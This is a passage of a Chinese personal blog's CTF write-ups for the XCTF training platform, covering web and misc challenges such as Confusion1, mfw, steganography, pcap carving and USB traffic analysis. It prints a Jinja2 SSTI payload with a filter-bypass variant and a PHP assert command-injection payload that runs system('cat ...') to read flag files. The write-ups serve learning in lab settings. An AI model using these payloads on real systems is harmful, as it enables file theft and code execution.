+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb.html" itemprop="url">攻防世界web</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-19T21:10:34+08:00">
+                2023-10-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><p><img src="/img/image-20231019211535114.png" alt="image-20231019211535114"></p>
+<p>login.php中Ctrl+U查看页面源码发现flag路径</p>
+<p><img src="/img/image-20231019211606001.png" alt="image-20231019211606001"></p>
+<p>login.php4测试ssti漏洞</p>
+<p><img src="/img/image-20231019211630276.png" alt="image-20231019211630276"></p>
+<p>测试pyaload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231019211702087.png" alt="image-20231019211702087"></p>
+<p>被过滤了</p>
+<p>参数替换payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231019211752275.png" alt="image-20231019211752275"></p>
+<p>cyberpeace{6df74ab602e50a9c41d5bb417cb241ed} </p>
+<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc.html" itemprop="url">攻防世界misc</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-14T11:11:46+08:00">
+                2023-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Banmabanma"><a href="#Banmabanma" class="headerlink" title="Banmabanma"></a>Banmabanma</h2><p>打开是张png图片，条形码，直接在线解码</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/image-20231012201650145.png" alt="image-20231012201650145"></h2><p><img src="/img/image-20231012234119565-1697249980732-5.png" alt="image-20231012234119565"></p>
+<p>stesolve打开</p>
+<p><img src="/img/image-20231012234237210-1697249987950-7.png" alt="image-20231012234237210"></p>
+<p>winhex打开，ctrl+r选择转换方式</p>
+<p><img src="/img/image-20231012234321087.png" alt="image-20231012234321087"></p>
+<p>发现.py,flag</p>
+<p><img src="/img/image-20231012232615491.png" alt="image-20231012232615491"></p>
+<p>保存为pyc后缀,在线网站反编译</p>
+<p><img src="/img/image-20231012234501702.png" alt="image-20231012234501702"></p>
+<p><img src="/img/image-20231012234519542.png" alt="image-20231012234519542"></p>
+<h3 id="心仪的公司"><a href="#心仪的公司" class="headerlink" title="心仪的公司"></a>心仪的公司</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings webshell.pcapng |grep &#123;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231012235913529.png" alt="image-20231012235913529"></p>
+<h2 id="pure-color"><a href="#pure-color" class="headerlink" title="pure_color"></a>pure_color</h2><p><img src="/img/image-20231014102045432.png" alt="image-20231014102045432"></p>
+<p><img src="/img/image-20231014102055075.png" alt="image-20231014102055075"></p>
+<h2 id="2017-Dating-in-Singapore"><a href="#2017-Dating-in-Singapore" class="headerlink" title="2017_Dating_in_Singapore"></a>2017_Dating_in_Singapore</h2><p>按中间的-分隔数字，刚好是12行，都是十进制数，不足10的在前面补0，将数字按顺序在图中标出来，发现flag</p>
+<p><img src="/img/image-20231014102107390.png" alt="image-20231014102107390"></p>
+<p><img src="/img/image-20231014102116944.png" alt="image-20231014102116944"></p>
+<h2 id="simple-transfer"><a href="#simple-transfer" class="headerlink" title="simple_transfer"></a>simple_transfer</h2><p>下载是个.pcap文件</p>
+<p>分离发现pdf，建议使用foremost，因为用binwalk发现pdf损坏</p>
+<p><img src="/img/image-20231014102125672.png" alt="image-20231014102125672"></p>
+<p>直接打开pdf<br><img src="/img/image-20231014102132634.png" alt="image-20231014102132634"></p>
+<p>HITB{b3d0e380e9c39352c667307d010775ca}</p>
+<h2 id="Training-Stegano-1"><a href="#Training-Stegano-1" class="headerlink" title="Training-Stegano-1"></a>Training-Stegano-1</h2><p>下载是个bmp文件</p>
+<p>bmp：Windows操作系统中的标准图像文件格式<br>图片上就一个点，很抽象，结合题目描述：这是我能想到的最基础的图片隐写术</p>
+<p><img src="/img/image-20231014102142609.png" alt="image-20231014102142609"></p>
+<p>直接010打开或者notepad++都行</p>
+<p><img src="/img/image-20231014102150964.png" alt="image-20231014102150964"></p>
+<p>flag：steganoI</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>下载解压后是</p>
+<p><img src="/img/image-20231014102157969.png" alt="image-20231014102157969"></p>
+<p>直接记事本打开</p>
+<p><img src="/img/image-20231014102206942.png" alt="image-20231014102206942"></p>
+<p>brainfuck在线解释器：<a target="_blank" rel="noopener" href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p>
+<p><img src="/img/image-20231014102213269.png" alt="image-20231014102213269"></p>
+<h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><p>010打开发现png头，就改后缀为png，放到stesolve里面也没什么发现，ok，不会了</p>
+<p>看了wp发现竟然这里有hint</p>
+<p><img src="/img/image-20231014102223894.png" alt="image-20231014102223894"></p>
+<p>中间居然有个二维码</p>
+<p><img src="/img/image-20231014102240809.png" alt="image-20231014102240809"></p>
+<p>直接扫不出来，wp说可以使用ps将两个比较清晰的二维码拼成一个完整的直接扫，但我没有ps。010打开，文件末尾有一个网站可以下载一个图片，然后使用python脚本</p>
+<p><img src="/img/image-20231014102249670.png" alt="image-20231014102249670"></p>
+<p>那个图片下不来，但是知道后面只要用python脚本跑一下</p>
+<p>其他解法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56161093/article/details/122471779">https://blog.csdn.net/m0_56161093/article/details/122471779</a></p>
+<h2 id="Janos-the-Ripper"><a href="#Janos-the-Ripper" class="headerlink" title="János-the-Ripper"></a>János-the-Ripper</h2><p>没什么好说的，直接改成.zip后缀，密码爆破即可。</p>
+<p>发现这里面的题目普遍不给文件后缀</p>
+<h2 id="Test-flag-please-ignore"><a href="#Test-flag-please-ignore" class="headerlink" title="Test-flag-please-ignore"></a>Test-flag-please-ignore</h2><p>打开</p>
+<p><img src="/img/image-20231014102255899.png" alt="image-20231014102255899"></p>
+<p>直接16进制转字符串</p>
+<h2 id="hong"><a href="#hong" class="headerlink" title="hong"></a>hong</h2><p>解压后是MP3格式，但是用音频软件打不开，那就分离试试<br><img src="/img/image-20231014102303639.png" alt="image-20231014102303639"></p>
+<p>第一张图片扫码后是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03f30d0ad41db4576300000000000000000100000040000000730d0000006400008400005a00006401005328020000006300000000030000000700000043000000734b0000006401006402006403006404006405006406006407006707007d00006408007d0100781e007c0000445d16007d02007c01007400007c0200830100377d0100712800577c010047486400005328090000004e694d0000006972000000692e0000006948000000696f000000696e0000006967000000740000000028010000007403000000636872280300000074030000007374727404000000666c6167740100000069280000000028000000007304000000612e7079520300000001000000730a00000000011b0106010d0114024e280100000052030000002800000000280000000028000000007304000000612e707974080000003c6d6f64756c653e010000007300000000</span><br></pre></td></tr></table></figure>
+
+<p>是”适合作为桌面”那一题的解法，但是修改代码并运行发现不是flag</p>
+<p><img src="/img/image-20231014102309670.png" alt="image-20231014102309670"></p>
+<p><img src="/../../../../source/img/image-20231013190250746.png" alt="image-20231013190250746"></p>
+<p>另一张图片</p>
+<p><img src="/img/image-20231014102314485.png" alt="image-20231014102314485"></p>
+<h2 id="misc-pic-again"><a href="#misc-pic-again" class="headerlink" title="misc_pic_again"></a>misc_pic_again</h2><p>一张png图片</p>
+<p><img src="/img/image-20231014102318984.png" alt="image-20231014102318984"></p>
+<p>lsb隐写，藏了一个zip文件，保存出来，解压出来是一个1文件，然后嘞，010搜flag发现没有，其实搜索词应该是hctf，或者{</p>
+<p><img src="/img/image-20231014102323424.png" alt="image-20231014102323424"></p>
+<h3 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h3><p><img src="/img/image-20231014102328059.png" alt="image-20231014102328059"></p>
+<p><img src="/img/image-20231014102332111.png" alt="image-20231014102332111"></p>
+<h2 id="hit-the-core"><a href="#hit-the-core" class="headerlink" title="hit-the-core"></a>hit-the-core</h2><p>.core文件，直接strings查找字符，这里就考验细心了，XCTF每个相隔4个字符</p>
+<p><img src="/img/image-20231014102337066.png" alt="image-20231014102337066"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num=&#x27;cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in  range(3,len(num),5):</span><br><span class="line">   flag += num[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><p>打开是一个抽象的gif？？？</p>
+<p><img src="/img/image-20231014102341590.png" alt="image-20231014102341590"></p>
+<p>这题的意思就是把每一帧按从左往右拼接起来就是flag，wp有人是用kali的convert和montage，或者是python脚本，但是直接网站一键分解即可<br>gif动态图分解：<a target="_blank" rel="noopener" href="https://tu.sioe.cn/gj/fenjie/">https://tu.sioe.cn/gj/fenjie/</a><br><img src="/img/image-20231014102351099.png" alt="image-20231014102351099"></p>
+<p>只能说nb，TWCTF{Bliss by Charles O’Rear}</p>
+<h2 id="normal-png"><a href="#normal-png" class="headerlink" title="normal_png"></a>normal_png</h2><p>一张图片</p>
+<p><img src="/img/image-20231014102354834.png" alt="image-20231014102354834"></p>
+<p>发现crc不对，可能是图片高度有问题</p>
+<p><img src="/img/image-20231014102359985.png" alt="image-20231014102359985"></p>
+<p><img src="/img/image-20231014102404554.png" alt="image-20231014102404554"></p>
+<p><img src="/img/image-20231014102407779.png" alt="image-20231014102407779"></p>
+<h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2><p>题目是一个gif，010打开，发现末尾是类似base的字符，解码两次出flag</p>
+<p><img src="/img/image-20231014102411866.png" alt="image-20231014102411866"></p>
+<p>密钥是ISCC</p>
+<p><img src="/img/image-20231014102416825.png" alt="image-20231014102416825"></p>
+<h2 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h2><p>rar文件解压出</p>
+<p><img src="/img/image-20231014102423169.png" alt="image-20231014102423169"></p>
+<p>hint.txt: try to find the secret of pixels</p>
+<p>我们使用stegsolve联合两个图片</p>
+<p><img src="/img/image-20231014102426754.png" alt="image-20231014102426754"></p>
+<p>然后save保存，再用stegsolve打开，发现二维码</p>
+<p><img src="/img/image-20231014102430712.png" alt="image-20231014102430712"></p>
+<p><img src="/img/image-20231014102436557.png" alt="image-20231014102436557"></p>
+<p>NCTF{m1sc_1s_very_funny!!!}</p>
+<h2 id="Ditf"><a href="#Ditf" class="headerlink" title="Ditf"></a>Ditf</h2><p>打开是一张图片，010打开发现尾部不是png尾，说明里面有东西，foremost分解出来</p>
+<p><img src="/img/image-20231014102444072.png" alt="image-20231014102444072"></p>
+<p><img src="/img/image-20231014102449510.png" alt="image-20231014102449510"></p>
+<p>但其实一开始是有发现图片的高度不对，CRC爆破发现</p>
+<p><img src="/img/image-20231014102452465.png" alt="image-20231014102452465"></p>
+<p>是rar的密码，输入密码</p>
+<p><img src="/img/image-20231014102456694.png" alt="image-20231014102456694"></p>
+<p>记事本打开</p>
+<p><img src="/img/image-20231014102502694.png" alt="image-20231014102502694"></p>
+<p><img src="/img/image-20231014102505203.png" alt="image-20231014102505203"></p>
+<h2 id="miss-01"><a href="#miss-01" class="headerlink" title="miss_01"></a>miss_01</h2><p>解压，唉？</p>
+<p><img src="/img/image-20231014102510764.png" alt="image-20231014102510764"></p>
+<p><img src="/img/image-20231014102514979.png" alt="image-20231014102514979"></p>
+<p>docx是空的，我们再看看zip文件，是wav，但是要密码</p>
+<p><img src="/img/image-20231014102517921.png" alt="image-20231014102517921"></p>
+<p>问题就是zip文件损坏，扔到zip修复大师修复后打开，打开docx，题目名是miss，所以想到有没有隐藏字符<img src="/img/image-20231014102527984.png" alt="image-20231014102527984"></p>
+<p><img src="/img/image-20231014102531130.png" alt="image-20231014102531130"></p>
+<p>确实是有</p>
+<p><img src="/img/image-20231014102535844.png" alt="image-20231014102535844"></p>
+<p>搜一下这个线索waoootu.epj,<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=nv&spm=1001.2101.3001.7020">nv</a> o，得到线索是希尔加密，密钥就是<a target="_blank" rel="noopener" href="http://www.verymuch.net/">www.verymuch.net</a></p>
+<p><img src="/img/image-20231014102540449.png" alt="image-20231014102540449"></p>
+<p>加密出来的密码是rabbit的密码，进行解密</p>
+<p><img src="/img/image-20231014102544352.png" alt="image-20231014102544352"></p>
+<p>base32解码</p>
+<p><img src="/img/image-20231014102547691.png" alt="image-20231014102547691"></p>
+<p><img src="/../../../../source/img/image-20231014010200653.png" alt="image-20231014010200653"></p>
+<p>变成新佛曰编码</p>
+<p><img src="/img/image-20231014102550848.png" alt="image-20231014102550848"></p>
+<p>fun.zip解压密码：Live beautifully, dream passionately, love completely.</p>
+<p>打开音频文件，显示频谱图</p>
+<p><img src="/img/image-20231014102554145.png" alt="image-20231014102554145"></p>
+<p><img src="/img/image-20231014102557925.png" alt="image-20231014102557925"></p>
+<p>flag{m1sc_1s_funny2333}</p>
+<p>##m0_01</p>
+<p>解压是12.pcapng，试着foremost，不行，用wireshark打开</p>
+<p><img src="/img/image-20231014105840050.png" alt="image-20231014105840050"></p>
+<p>usb流量分析，第一次接触这种题，我们来了解一下一些基础知识</p>
+<p>USB协议数据在Leftover Capture Data域中，鼠标流量数据长度为四个字节，键盘流量数据长度为八个字节。</p>
+<p>鼠标流量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一个字节：代表按键（00时,代表没有按键；01时,代表按左键；02时,代表当前按键为右键）</span><br><span class="line">第二个字节：值为正时，代表鼠标右移像素位；</span><br><span class="line">值为负时，代表鼠标左移像素位</span><br><span class="line">第三个字节：代表垂直上下移动的偏移（当值为正时，代表鼠标上移像素位；值为负时，代表鼠标下移像素位）</span><br></pre></td></tr></table></figure>
+
+<p>随便打开一个数据包查看Leftover Capture Data域，图示是8字节，所以是键盘流量</p>
+<p><img src="/img/image-20231014110211471.png" alt="image-20231014110211471"></p>
+<p>使用kali，在wireshark的tshark工具下将数据提取为文本文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 12.pcapng -T fields -e usb.capdata&gt;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20231014110545953.png" alt="image-20231014110545953"></p>
+<p>使用键盘流量脚本破解</p>
+<p><img src="/img/image-20231014110517932.png" alt="image-20231014110517932"></p>
+<p>这段数字只有01248，是云影密码</p>
+<p><img src="/img/image-20231014110703004.png" alt="image-20231014110703004"></p>
+<p>flag{THISISFLAG}</p>
+<p>usb流量分析学习：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46150940/article/details/115431953">https://blog.csdn.net/qq_46150940/article/details/115431953</a></p>
+<h2 id="津门杯2021-m1"><a href="#津门杯2021-m1" class="headerlink" title="津门杯2021-m1"></a>津门杯2021-m1</h2><p>这题纯纯因为对密码编码不够熟悉，看到base都没有发现</p>
+<p><img src="/img/image-20231014113752658.png" alt="image-20231014113752658"></p>
+<h2 id="流量分析1"><a href="#流量分析1" class="headerlink" title="流量分析1"></a>流量分析1</h2><p>感觉需要计网的知识，不然有点懵</p>
+<h2 id="misc2-1"><a href="#misc2-1" class="headerlink" title="misc2-1"></a>misc2-1</h2><p>解压打开是一张图片，但是损坏，不能打开，我们使用010打开看看，这样是逆序的图片</p>
+<p><img src="/img/image-20231015130428752.png" alt="image-20231015130428752"></p>
+<p>正常应该是</p>
+<p><img src="/img/image-20231015130456154.png" alt="image-20231015130456154"></p>
+<p>使用脚本恢复</p>
+<p><img src="/img/image-20231015130558879.png" alt="image-20231015130558879"></p>
+<h2 id="Let-god-knows"><a href="#Let-god-knows" class="headerlink" title="Let_god_knows"></a>Let_god_knows</h2><p><img src="/img/image-20231015131638056.png" alt="image-20231015131638056"></p>
+<p>开头两个字节是BM，说明是bmp格式的图片</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E5%88%B7%E9%A2%98.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E5%88%B7%E9%A2%98.html" itemprop="url">刷题</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-10-10T14:34:53+08:00">
+                2023-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>Git是一个版本控制系统，在配置不当的情况下，可能会导致<code>.git</code>文件夹被直接部署到线上环境中，这可能会导致Git泄露问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> <span class="number">1</span><span class="string">&#x27;) or system(&#x27;</span>cat+./templates/flag.php<span class="string">&#x27;);// . &quot;.php&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// I heard &#x27;</span>..<span class="string">&#x27; is dangerous!</span></span><br><span class="line"><span class="string">assert(&quot;strpos(&#x27;</span><span class="variable">$file</span><span class="string">&#x27;, &#x27;</span>..<span class="string">&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TODO: Make this look nice</span></span><br><span class="line"><span class="string">assert(&quot;file_exists(&#x27;</span><span class="variable">$file</span><span class="string">&#x27;)&quot;) or die(&quot;That file doesn&#x27;</span>t exist!<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=&#x27;) or system(&#x27;cat ./templates/flag.php&#x27;);//</span><br></pre></td></tr></table></figure>
+
+<p>传入之后变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=&quot;templates/&#x27;) or system(&#x27;cat ./templates/flag.php&#x27;);//.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>strpos()返回false，再利用or让其执行system函数，再用” &#x2F;&#x2F; “将后面的语句注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(&quot;strpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);//.php, &#x27;..&#x27;) === false&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>下划线内容被注释掉了，所以assert执行了以下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(&#x27;template/&#x27;) or system(&#x27;cat ./template/flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><code>or</code>:如果表达式1为 <code>true</code>，那么整个逻辑或操作返回 <code>true</code>，不会再去计算表达式2,这被称为”短路评估”,如果表达式1为 <code>false</code>，那么整个逻辑或操作会继续评估表达式2，如果表达式2为 <code>true</code>，则整个操作返回 <code>true</code>，否则返回 <code>false</code></p>
+<p>右键查看源代码</p>
+<p><img src="C:\Users\晗\AppData\Roaming\Typora\typora-user-images\image-20230927110013408.png" alt="image-20230927110013408"></p>
+<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;i = <span class="number">0</span>;j = tab.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        k = j + (l) + (n=<span class="number">0</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        n = tab2.<span class="property">length</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        o = tab[i-l];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                                        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        pass = p;<span class="keyword">return</span> pass;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span 